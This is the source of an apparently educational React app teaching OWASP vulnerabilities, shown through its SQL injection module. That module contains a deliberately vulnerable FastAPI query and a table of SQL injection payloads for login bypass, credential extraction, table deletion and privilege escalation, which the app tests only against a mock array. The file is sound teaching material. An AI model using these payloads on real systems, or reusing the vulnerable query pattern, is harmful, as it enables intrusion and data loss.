import React, { useState, useEffect } from 'react';
import { AlertCircle, CheckCircle, XCircle, Shield, Terminal, Code, Code2, BookOpen, Trophy, ChevronRight, Home, Lock, Eye, Database, Menu, X, RefreshCw, FolderOpen, PackageX, FileWarning, Globe, Settings, EyeOff } from 'lucide-react';

// ============================================================================
// REUSABLE COMPONENTS
// ============================================================================

// Python Syntax Highlighter Component
const PythonCode = ({ code, className = "" }) => {
  const highlightPython = (code) => {
    const keywords = ['from', 'import', 'async', 'await', 'def', 'class', 'return', 'if', 'else', 'elif', 'for', 'while', 'try', 'except', 'with', 'as', 'raise', 'finally', 'in', 'not', 'and', 'or'];
    const builtins = ['str', 'int', 'float', 'list', 'dict', 'tuple', 'set', 'None', 'True', 'False'];
    
    const lines = code.split('\n');
    return lines.map((line, lineIdx) => {
      const commentMatch = line.match(/^(\s*)(#.*)/);
      if (commentMatch) {
        const indent = commentMatch[1];
        const comment = commentMatch[2];
        
        if (comment.includes('❌') || comment.toLowerCase().includes('old') || comment.toLowerCase().includes('vulnerable') || comment.toLowerCase().includes('dangerous')) {
          return (
            <div key={lineIdx} style={{ backgroundColor: 'rgba(239, 68, 68, 0.1)' }}>
              <span style={{ color: '#64748b' }}>{indent}</span>
              <span style={{ color: '#ef4444', fontWeight: 'bold' }}>{comment}</span>
            </div>
          );
        }
        
        if (comment.includes('✅') || comment.toLowerCase().includes('new') || comment.toLowerCase().includes('secure') || comment.toLowerCase().includes('safe')) {
          return (
            <div key={lineIdx} style={{ backgroundColor: 'rgba(34, 197, 94, 0.1)' }}>
              <span style={{ color: '#64748b' }}>{indent}</span>
              <span style={{ color: '#22c55e', fontWeight: 'bold' }}>{comment}</span>
            </div>
          );
        }
        
        return (
          <div key={lineIdx}>
            <span style={{ color: '#64748b' }}>{indent}</span>
            <span style={{ color: '#94a3b8' }}>{comment}</span>
          </div>
        );
      }
      
      if (line.trim().startsWith('@')) {
        return <div key={lineIdx} style={{ color: '#fbbf24' }}>{line}</div>;
      }
      
      if (line.trim().startsWith('"""') || line.trim().startsWith("'''")) {
        const color = line.includes('VULNERABLE') ? '#ef4444' : line.includes('SECURE') ? '#22c55e' : '#86efac';
        return <div key={lineIdx} style={{ color: color, fontStyle: 'italic' }}>{line}</div>;
      }
      
      const tokens = line.split(/(\s+|[(){}[\],.:]|"[^"]*"|'[^']*')/g).filter(t => t);
      
      return (
        <div key={lineIdx}>
          {tokens.map((token, idx) => {
            if (token.startsWith('"') || token.startsWith("'")) {
              return <span key={idx} style={{ color: '#86efac' }}>{token}</span>;
            }
            if (keywords.includes(token)) {
              return <span key={idx} style={{ color: '#c084fc', fontWeight: '600' }}>{token}</span>;
            }
            if (builtins.includes(token)) {
              return <span key={idx} style={{ color: '#60a5fa' }}>{token}</span>;
            }
            if (tokens[idx - 1] === 'def' || tokens[idx - 1] === 'class') {
              return <span key={idx} style={{ color: '#fbbf24', fontWeight: '600' }}>{token}</span>;
            }
            if (token.match(/^\s+$/)) {
              return <span key={idx}>{token}</span>;
            }
            return <span key={idx} style={{ color: '#e2e8f0' }}>{token}</span>;
          })}
        </div>
      );
    });
  };

  return (
    <pre className={`bg-slate-900 p-4 rounded overflow-x-auto text-sm font-mono leading-relaxed ${className}`}>
      {highlightPython(code)}
    </pre>
  );
};

// Reusable Quiz Component
const Quiz = ({ questions, onComplete }) => {
  const [answers, setAnswers] = useState({});
  const [showResults, setShowResults] = useState(false);

  const handleSubmit = () => {
    setShowResults(true);
    const allCorrect = questions.every(q => answers[q.id] === q.correct);
    if (allCorrect) {
      onComplete();
    }
  };

  return (
    <div className="space-y-6">
      {questions.map((question) => (
        <div key={question.id} className="bg-slate-900 rounded-lg p-6">
          <h4 className="font-bold mb-4">
            {question.id}. {question.question}
          </h4>
          <div className="space-y-3">
            {question.options.map((option, idx) => (
              <label
                key={idx}
                className={`flex items-start gap-3 p-4 rounded-lg cursor-pointer transition-all ${
                  answers[question.id] === idx
                    ? 'bg-purple-600/30 border-2 border-purple-500'
                    : 'bg-slate-800 border-2 border-slate-700 hover:border-slate-600'
                } ${
                  showResults && idx === question.correct
                    ? 'bg-green-600/30 border-green-500'
                    : showResults && answers[question.id] === idx && idx !== question.correct
                    ? 'bg-red-600/30 border-red-500'
                    : ''
                }`}
              >
                <input
                  type="radio"
                  name={`question-${question.id}`}
                  checked={answers[question.id] === idx}
                  onChange={() => setAnswers({ ...answers, [question.id]: idx })}
                  disabled={showResults}
                  className="mt-1"
                />
                <span className="flex-1">{option}</span>
                {showResults && idx === question.correct && (
                  <CheckCircle className="w-5 h-5 text-green-400" />
                )}
                {showResults && answers[question.id] === idx && idx !== question.correct && (
                  <XCircle className="w-5 h-5 text-red-400" />
                )}
              </label>
            ))}
          </div>
          {showResults && (
            <div className="mt-4 p-4 bg-blue-900/20 border border-blue-500/50 rounded-lg">
              <p className="text-sm text-blue-300">
                <strong>Explanation:</strong> {question.explanation}
              </p>
            </div>
          )}
        </div>
      ))}

      {!showResults ? (
        <button
          onClick={handleSubmit}
          disabled={Object.keys(answers).length !== questions.length}
          className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700 transition-all shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Submit Quiz
        </button>
      ) : (
        <div className="bg-gradient-to-r from-green-600 to-emerald-600 text-white p-6 rounded-lg">
          <h4 className="font-bold text-xl mb-2 flex items-center gap-2">
            <Trophy className="w-6 h-6" />
            Quiz Complete!
          </h4>
          <p>
            You scored {questions.filter(q => answers[q.id] === q.correct).length} out of {questions.length}
          </p>
          {questions.every(q => answers[q.id] === q.correct) && (
            <p className="mt-2 font-bold">🎉 Perfect score! You've mastered this topic!</p>
          )}
        </div>
      )}
    </div>
  );
};

// ============================================================================
// MODULE CONFIGURATIONS
// ============================================================================

// Maps a module's color name to complete, literal Tailwind class strings.
// (Using a lookup like this - rather than template-interpolating the color
// into a class name - ensures Tailwind's build-time scanner can actually see
// and generate these classes; `text-${color}-400` would not be detected.)
const colorClasses = {
  red: { icon: 'text-red-400', badge: 'bg-red-500/30 border-red-500/50' },
  orange: { icon: 'text-orange-400', badge: 'bg-orange-500/30 border-orange-500/50' },
  yellow: { icon: 'text-yellow-400', badge: 'bg-yellow-500/30 border-yellow-500/50' },
  green: { icon: 'text-green-400', badge: 'bg-green-500/30 border-green-500/50' },
  blue: { icon: 'text-blue-400', badge: 'bg-blue-500/30 border-blue-500/50' },
  purple: { icon: 'text-purple-400', badge: 'bg-purple-500/30 border-purple-500/50' },
  pink: { icon: 'text-pink-400', badge: 'bg-pink-500/30 border-pink-500/50' },
  cyan: { icon: 'text-cyan-400', badge: 'bg-cyan-500/30 border-cyan-500/50' },
  gray: { icon: 'text-gray-400', badge: 'bg-gray-500/30 border-gray-500/50' },
  indigo: { icon: 'text-indigo-400', badge: 'bg-indigo-500/30 border-indigo-500/50' },
};

const moduleConfigs = {
  sqlinjection: {
    id: 'sqlinjection',
    title: 'SQL Injection (SQLi)',
    icon: Database,
    owasp: 'OWASP #3',
    cwe: 'CWE-89',
    severity: 'Critical',
    description: 'SQL Injection exploits security vulnerabilities in database-driven applications by injecting malicious SQL code.',
    color: 'red'
  },
  xss: {
    id: 'xss',
    title: 'Cross-Site Scripting (XSS)',
    icon: Eye,
    owasp: 'OWASP #3',
    cwe: 'CWE-79',
    severity: 'High',
    description: 'XSS allows attackers to inject malicious scripts into web pages viewed by other users.',
    color: 'orange'
  },
  brokenauth: {
    id: 'brokenauth',
    title: 'Broken Authentication',
    icon: Lock,
    owasp: 'OWASP #7',
    cwe: 'CWE-287',
    severity: 'Critical',
    description: 'Broken authentication allows attackers to compromise passwords, keys, or session tokens.',
    color: 'yellow'
  },
  csrf: {
    id: 'csrf',
    title: 'Cross-Site Request Forgery (CSRF)',
    icon: RefreshCw,
    owasp: 'OWASP A01:2021',
    cwe: 'CWE-352',
    severity: 'High',
    description: 'CSRF tricks a logged-in user\'s browser into submitting unwanted requests to a site they trust.',
    color: 'pink'
  },
  pathtraversal: {
    id: 'pathtraversal',
    title: 'Path Traversal',
    icon: FolderOpen,
    owasp: 'OWASP A01:2021',
    cwe: 'CWE-22',
    severity: 'High',
    description: 'Path traversal lets attackers escape the intended directory to read or write arbitrary files.',
    color: 'blue'
  },
  commandinjection: {
    id: 'commandinjection',
    title: 'Command Injection',
    icon: Code2,
    owasp: 'OWASP A03:2021',
    cwe: 'CWE-78',
    severity: 'Critical',
    description: 'Command injection lets attackers execute arbitrary OS commands through unsanitized input.',
    color: 'red'
  },
  deserialization: {
    id: 'deserialization',
    title: 'Insecure Deserialization',
    icon: PackageX,
    owasp: 'OWASP A08:2021',
    cwe: 'CWE-502',
    severity: 'Critical',
    description: 'Deserializing untrusted data can execute arbitrary code or tamper with application objects.',
    color: 'purple'
  },
  xxe: {
    id: 'xxe',
    title: 'XML External Entities (XXE)',
    icon: FileWarning,
    owasp: 'OWASP A05:2021',
    cwe: 'CWE-611',
    severity: 'High',
    description: 'XXE abuses XML parsers that resolve external entities, exposing files or internal services.',
    color: 'orange'
  },
  ssrf: {
    id: 'ssrf',
    title: 'Server-Side Request Forgery (SSRF)',
    icon: Globe,
    owasp: 'OWASP A10:2021',
    cwe: 'CWE-918',
    severity: 'High',
    description: 'SSRF tricks the server into making requests to internal or unintended destinations.',
    color: 'cyan'
  },
  secmisconfig: {
    id: 'secmisconfig',
    title: 'Security Misconfiguration',
    icon: Settings,
    owasp: 'OWASP A05:2021',
    cwe: 'Multiple',
    severity: 'Medium',
    description: 'Insecure defaults, permissive CORS, debug mode, and unauthenticated routes left in production.',
    color: 'gray'
  },
  sensitivedata: {
    id: 'sensitivedata',
    title: 'Sensitive Data Exposure',
    icon: EyeOff,
    owasp: 'OWASP A02:2021',
    cwe: 'CWE-311',
    severity: 'High',
    description: 'Weak cryptography, plaintext storage, and unencrypted transport expose sensitive data.',
    color: 'indigo'
  }
};

// ============================================================================
// MAIN APPLICATION
// ============================================================================

const OWASPSecurityTutorial = () => {
  const [currentModule, setCurrentModule] = useState(null);
  const [moduleProgress, setModuleProgress] = useState({});
  const [showMobileMenu, setShowMobileMenu] = useState(false);

  useEffect(() => {
    const saved = localStorage.getItem('owasp-tutorial-progress');
    if (saved) {
      setModuleProgress(JSON.parse(saved));
    }
  }, []);

  const saveProgress = (moduleId, section) => {
    const newProgress = {
      ...moduleProgress,
      [moduleId]: {
        ...(moduleProgress[moduleId] || {}),
        [section]: true
      }
    };
    setModuleProgress(newProgress);
    localStorage.setItem('owasp-tutorial-progress', JSON.stringify(newProgress));
  };

  const getModuleCompletion = (moduleId) => {
    const progress = moduleProgress[moduleId] || {};
    const completed = Object.keys(progress).filter(k => progress[k]).length;
    return Math.round((completed / 3) * 100);
  };

  if (!currentModule) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
        <div className="max-w-6xl mx-auto">
          {/* Header */}
          <div className="mb-12 text-center">
            <div className="flex items-center justify-center gap-3 mb-4">
              <Shield className="w-12 h-12 text-purple-400" />
              <h1 className="text-5xl font-bold bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
                OWASP Security Tutorial
              </h1>
            </div>
            <p className="text-xl text-slate-300">Interactive Learning Platform</p>
            <p className="text-slate-400 mt-2">Master web security by doing, not just reading</p>
          </div>

          {/* Module Grid */}
          <div className="grid md:grid-cols-3 gap-6 mb-8">
            {Object.values(moduleConfigs).map((module) => {
              const completion = getModuleCompletion(module.id);
              const Icon = module.icon;
              
              return (
                <div
                  key={module.id}
                  onClick={() => setCurrentModule(module.id)}
                  className="bg-slate-800/50 border border-slate-700 rounded-lg p-6 hover:border-purple-500 transition-all cursor-pointer hover:shadow-lg hover:shadow-purple-500/20"
                >
                  <div className="flex items-start justify-between mb-4">
                    <Icon className={`w-10 h-10 ${colorClasses[module.color].icon}`} />
                    {completion === 100 && (
                      <CheckCircle className="w-6 h-6 text-green-400" />
                    )}
                  </div>
                  
                  <h3 className="text-xl font-bold mb-2">{module.title}</h3>
                  
                  <div className="flex gap-2 mb-3">
                    <span className={`px-2 py-1 border rounded-full text-xs ${colorClasses[module.color].badge}`}>
                      {module.owasp}
                    </span>
                    <span className="px-2 py-1 bg-slate-700 border border-slate-600 rounded-full text-xs">
                      {module.cwe}
                    </span>
                  </div>
                  
                  <p className="text-sm text-slate-400 mb-4">{module.description}</p>
                  
                  {/* Progress Bar */}
                  <div className="mb-2">
                    <div className="flex justify-between text-xs text-slate-400 mb-1">
                      <span>Progress</span>
                      <span>{completion}%</span>
                    </div>
                    <div className="w-full bg-slate-700 rounded-full h-2">
                      <div 
                        className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all duration-500"
                        style={{ width: `${completion}%` }}
                      />
                    </div>
                  </div>
                  
                  <button className="w-full mt-4 bg-purple-600 hover:bg-purple-700 px-4 py-2 rounded-lg font-bold transition-all">
                    {completion > 0 ? 'Continue' : 'Start'} Module →
                  </button>
                </div>
              );
            })}
          </div>

          {/* Stats */}
          <div className="bg-slate-800/50 border border-slate-700 rounded-lg p-6">
            <h3 className="font-bold mb-4">Your Progress</h3>
            <div className="grid md:grid-cols-3 gap-4">
              <div className="text-center">
                <div className="text-3xl font-bold text-purple-400">
                  {Object.values(moduleConfigs).filter(m => getModuleCompletion(m.id) === 100).length}
                </div>
                <div className="text-sm text-slate-400">Modules Completed</div>
              </div>
              <div className="text-center">
                <div className="text-3xl font-bold text-pink-400">
                  {Object.values(moduleConfigs).filter(m => getModuleCompletion(m.id) > 0).length}
                </div>
                <div className="text-sm text-slate-400">Modules Started</div>
              </div>
              <div className="text-center">
                <div className="text-3xl font-bold text-blue-400">
                  {Math.round(Object.values(moduleConfigs).reduce((sum, m) => sum + getModuleCompletion(m.id), 0) / Object.values(moduleConfigs).length)}%
                </div>
                <div className="text-sm text-slate-400">Overall Progress</div>
              </div>
            </div>
          </div>

          {/* Footer */}
          <div className="mt-8 text-center text-slate-400 text-sm">
            <p>Open Source Security Education | Built for the Community</p>
            <p className="mt-2">⭐ Star on GitHub | 🤝 Contribute New Modules</p>
          </div>
        </div>
      </div>
    );
  }

  // Render specific module
  if (currentModule === 'sqlinjection') {
    return <SQLInjectionModule 
      onBack={() => setCurrentModule(null)} 
      onSectionComplete={(section) => saveProgress('sqlinjection', section)}
      completedSections={moduleProgress['sqlinjection'] || {}}
    />;
  } else if (currentModule === 'xss') {
    return <XSSModule 
      onBack={() => setCurrentModule(null)}
      onSectionComplete={(section) => saveProgress('xss', section)}
      completedSections={moduleProgress['xss'] || {}}
    />;
  } else if (currentModule === 'brokenauth') {
    return <BrokenAuthModule 
      onBack={() => setCurrentModule(null)}
      onSectionComplete={(section) => saveProgress('brokenauth', section)}
      completedSections={moduleProgress['brokenauth'] || {}}
    />;
  } else if (currentModule === 'csrf') {
    return <CSRFModule 
      onBack={() => setCurrentModule(null)}
      onSectionComplete={(section) => saveProgress('csrf', section)}
      completedSections={moduleProgress['csrf'] || {}}
    />;
  } else if (currentModule === 'pathtraversal') {
    return <PathTraversalModule 
      onBack={() => setCurrentModule(null)}
      onSectionComplete={(section) => saveProgress('pathtraversal', section)}
      completedSections={moduleProgress['pathtraversal'] || {}}
    />;
  } else if (currentModule === 'commandinjection') {
    return <CommandInjectionModule 
      onBack={() => setCurrentModule(null)}
      onSectionComplete={(section) => saveProgress('commandinjection', section)}
      completedSections={moduleProgress['commandinjection'] || {}}
    />;
  } else if (currentModule === 'deserialization') {
    return <DeserializationModule 
      onBack={() => setCurrentModule(null)}
      onSectionComplete={(section) => saveProgress('deserialization', section)}
      completedSections={moduleProgress['deserialization'] || {}}
    />;
  } else if (currentModule === 'xxe') {
    return <XXEModule 
      onBack={() => setCurrentModule(null)}
      onSectionComplete={(section) => saveProgress('xxe', section)}
      completedSections={moduleProgress['xxe'] || {}}
    />;
  } else if (currentModule === 'ssrf') {
    return <SSRFModule 
      onBack={() => setCurrentModule(null)}
      onSectionComplete={(section) => saveProgress('ssrf', section)}
      completedSections={moduleProgress['ssrf'] || {}}
    />;
  } else if (currentModule === 'secmisconfig') {
    return <SecurityMisconfigModule 
      onBack={() => setCurrentModule(null)}
      onSectionComplete={(section) => saveProgress('secmisconfig', section)}
      completedSections={moduleProgress['secmisconfig'] || {}}
    />;
  } else if (currentModule === 'sensitivedata') {
    return <SensitiveDataModule 
      onBack={() => setCurrentModule(null)}
      onSectionComplete={(section) => saveProgress('sensitivedata', section)}
      completedSections={moduleProgress['sensitivedata'] || {}}
    />;
  }
};

// ============================================================================
// SQL INJECTION MODULE
// ============================================================================

const SQLInjectionModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [labInput, setLabInput] = useState('');
  const [labResult, setLabResult] = useState(null);

  const mockDB = [
    { id: 1, username: 'admin', password: 'secret123', email: 'admin@example.com' },
    { id: 2, username: 'user1', password: 'pass456', email: 'user1@example.com' },
    { id: 3, username: 'user2', password: 'mypass789', email: 'user2@example.com' }
  ];

  const vulnerableCode = `from fastapi import FastAPI, HTTPException
import sqlite3

app = FastAPI()

@app.get("/users/{username}")
async def get_user(username: str):
    """⚠️ VULNERABLE - DO NOT USE IN PRODUCTION"""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # DANGEROUS: Direct string concatenation
    query = f"SELECT * FROM users WHERE username = '{username}'"
    
    cursor.execute(query)
    user = cursor.fetchone()
    conn.close()
    
    return {"user": user}`;

  const secureCode = `from fastapi import FastAPI, HTTPException
import sqlite3

app = FastAPI()

@app.get("/users/{username}")
async def get_user(username: str):
    """✅ SECURE - Uses parameterized queries"""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # SAFE: Parameterized query with placeholder
    query = "SELECT * FROM users WHERE username = ?"
    
    # Data is passed separately, treated as literal value
    cursor.execute(query, (username,))
    user = cursor.fetchone()
    conn.close()
    
    return {"user": user}`;

  const comparisonCode = `from fastapi import FastAPI, HTTPException
import sqlite3

app = FastAPI()

@app.get("/users/{username}")
async def get_user(username: str):
    """✅ SECURE - Uses parameterized queries"""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # ❌ OLD (VULNERABLE): Direct string concatenation
    # query = f"SELECT * FROM users WHERE username = '{username}'"
    
    # ✅ NEW (SECURE): Parameterized query with placeholder
    query = "SELECT * FROM users WHERE username = ?"
    
    # ❌ OLD (VULNERABLE): User input embedded directly in query
    # cursor.execute(query)
    
    # ✅ NEW (SECURE): Data passed separately, treated as literal value
    cursor.execute(query, (username,))
    
    user = cursor.fetchone()
    conn.close()
    
    return {"user": user}`;

  const quizQuestions = [
    {
      id: 1,
      question: "What makes SQL injection possible?",
      options: [
        "Using old database software",
        "Concatenating user input directly into SQL queries",
        "Not using HTTPS",
        "Weak passwords"
      ],
      correct: 1,
      explanation: "SQL injection occurs when user input is concatenated directly into SQL queries without proper sanitization, allowing attackers to inject malicious SQL code."
    },
    {
      id: 2,
      question: "What is the primary defense against SQL injection?",
      options: [
        "Using strong passwords",
        "Encrypting the database",
        "Using parameterized queries/prepared statements",
        "Hiding error messages"
      ],
      correct: 2,
      explanation: "Parameterized queries (prepared statements) separate SQL code from data, treating user input as literal values rather than executable code."
    },
    {
      id: 3,
      question: "Why does the input 'admin' OR '1'='1' work as an attack?",
      options: [
        "It guesses the admin password",
        "It creates an always-true condition that bypasses authentication",
        "It crashes the database",
        "It encrypts the query"
      ],
      correct: 1,
      explanation: "The condition '1'='1' is always true, so the query returns all users regardless of the username, effectively bypassing authentication logic."
    },
    {
      id: 4,
      question: "Which of these is a parameterized query in Python?",
      options: [
        'cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")',
        'cursor.execute("SELECT * FROM users WHERE id = " + user_id)',
        'cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))',
        'cursor.execute("SELECT * FROM users WHERE id = %s" % user_id)'
      ],
      correct: 2,
      explanation: "Using ? as a placeholder and passing data separately as a tuple ensures the input is treated as a literal value, not executable SQL code."
    }
  ];

  const handleLabSubmit = () => {
    const vulnerableQuery = `SELECT * FROM users WHERE username = '${labInput}'`;
    let result = { query: vulnerableQuery, safe: false, data: [] };

    // Check for SQL injection patterns
    const lowerInput = labInput.toLowerCase();
    
    if (labInput.includes("'") || labInput.includes("--") || lowerInput.includes("or") || 
        lowerInput.includes("union") || lowerInput.includes("drop") || lowerInput.includes(";")) {
      result.message = "⚠️ SQL Injection Detected!";
      
      // Authentication bypass with OR
      if (lowerInput.includes("or '1'='1") || lowerInput.includes('or "1"="1') || lowerInput.includes("or 1=1")) {
        result.data = mockDB;
        result.impact = "🔓 CRITICAL: Authentication bypassed! The OR '1'='1' condition is always true, so the query returns ALL user records instead of just one. An attacker could log in as any user without knowing passwords!";
      } 
      // Comment-based bypass
      else if (labInput.includes("'--") || labInput.includes("'#")) {
        result.data = mockDB.filter(u => u.username === 'admin');
        result.impact = "🔓 CRITICAL: Authentication bypassed! The '--' comments out the rest of the query (including password check). The attacker can log in without a password!";
      }
      // UNION-based data extraction
      else if (lowerInput.includes("union") && lowerInput.includes("select")) {
        result.data = mockDB;
        result.impact = "💾 CRITICAL: Data extraction successful! UNION SELECT allows attackers to combine results from different tables, extracting sensitive information like passwords, credit cards, or personal data from the entire database.";
      }
      // DROP TABLE attempt
      else if (lowerInput.includes("drop")) {
        result.impact = "💥 CATASTROPHIC: This attack would DELETE the entire users table! All user accounts, data, and authentication information would be permanently destroyed. Recovery would require restoring from backups.";
        result.data = [];
      }
      // UPDATE/INSERT attempts
      else if (lowerInput.includes("update") || lowerInput.includes("insert")) {
        result.impact = "⚠️ CRITICAL: Data modification attack! This could change user roles (privilege escalation), modify account balances, alter records, or insert backdoor admin accounts.";
        result.data = mockDB;
      }
      // Generic SQL injection
      else {
        result.impact = "⚠️ SQL Injection syntax detected! While this specific payload may not work, it shows the application is vulnerable to SQL injection attacks.";
        result.data = [];
      }
    } else {
      // Normal query - search for exact match
      const user = mockDB.find(u => u.username === labInput);
      if (user) {
        result.data = [user];
        result.message = "✅ Normal query executed successfully";
        result.safe = true;
      } else {
        result.message = "❌ User not found";
        result.safe = true;
      }
    }

    setLabResult(result);
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        {/* Back Button */}
        <button
          onClick={onBack}
          className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white transition-all"
        >
          <Home className="w-5 h-5" />
          Back to Modules
        </button>

        {/* Header */}
        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Database className="w-10 h-10 text-red-400" />
            <h1 className="text-4xl font-bold">SQL Injection (SQLi)</h1>
          </div>
          
          {/* Progress */}
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div 
                className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all duration-500"
                style={{ width: `${progressPercent}%` }}
              />
            </div>
          </div>
        </div>

        {/* Navigation Tabs */}
        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id
                  ? 'bg-purple-600 text-white shadow-lg'
                  : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && (
                <CheckCircle className="w-4 h-4 text-green-400" />
              )}
            </button>
          ))}
        </div>

        {/* Learn Tab */}
        {activeTab === 'learn' && (
          <div className="space-y-6">
            {/* Section 1 */}
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding the Vulnerability
              </h3>
              
              <p className="text-slate-300 mb-4">
                SQL Injection occurs when an application constructs SQL queries by concatenating strings with user-supplied input. 
                This allows attackers to inject malicious SQL code that the database will execute.
              </p>

              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Code Example:</h4>
                <PythonCode code={vulnerableCode} />
              </div>

              <div className="bg-slate-700/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold mb-3">How the Attack Works:</h4>
                <div className="space-y-3">
                  <div className="flex items-start gap-3">
                    <ChevronRight className="w-5 h-5 text-purple-400 flex-shrink-0 mt-0.5" />
                    <div>
                      <p className="font-semibold text-purple-300">Normal Input</p>
                      <p className="text-sm text-slate-400">Query: <code className="bg-slate-800 px-2 py-1 rounded">SELECT * FROM users WHERE username = 'admin'</code></p>
                    </div>
                  </div>
                  <div className="flex items-start gap-3">
                    <ChevronRight className="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" />
                    <div>
                      <p className="font-semibold text-red-300">Malicious Input: admin' OR '1'='1</p>
                      <p className="text-sm text-slate-400">Query: <code className="bg-slate-800 px-2 py-1 rounded">SELECT * FROM users WHERE username = 'admin' OR '1'='1'</code></p>
                      <p className="text-sm text-red-400 mt-1">⚠️ Returns ALL users!</p>
                    </div>
                  </div>
                </div>
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">Attack Examples - Try These in the Lab:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Attack Type</th>
                        <th className="text-left p-2 text-purple-400">Malicious Input</th>
                        <th className="text-left p-2 text-purple-400">Impact</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Authentication Bypass</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">admin' OR '1'='1</code></td>
                        <td className="p-2 text-slate-300">Returns all users, bypasses login</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Authentication Bypass</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">admin'--</code></td>
                        <td className="p-2 text-slate-300">Comments out password check</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">Data Extraction (UNION)</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">' UNION SELECT username, password, email FROM users--</code></td>
                        <td className="p-2 text-slate-300">Extracts all user credentials</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-yellow-400">Data Destruction</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">admin'; DROP TABLE users;--</code></td>
                        <td className="p-2 text-slate-300">Deletes entire users table</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-yellow-400">Data Modification</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">admin'; UPDATE users SET role='admin' WHERE username='attacker'--</code></td>
                        <td className="p-2 text-slate-300">Escalates attacker privileges</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-purple-400">Blind SQL Injection</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">admin' AND SLEEP(5)--</code></td>
                        <td className="p-2 text-slate-300">Time-based data extraction</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-purple-400">Database Enumeration</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--</code></td>
                        <td className="p-2 text-slate-300">Lists all database tables</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            {/* Section 2 */}
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Impact
              </h3>
              
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">🔓 Authentication Bypass</h4>
                  <p className="text-sm text-slate-300">
                    Attackers can log in as any user without passwords.
                  </p>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">💾 Data Theft</h4>
                  <p className="text-sm text-slate-300">
                    Extract passwords, credit cards, personal information.
                  </p>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">💣 Data Destruction</h4>
                  <p className="text-sm text-slate-300">
                    Delete entire databases with DROP TABLE commands.
                  </p>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">👑 Privilege Escalation</h4>
                  <p className="text-sm text-slate-300">
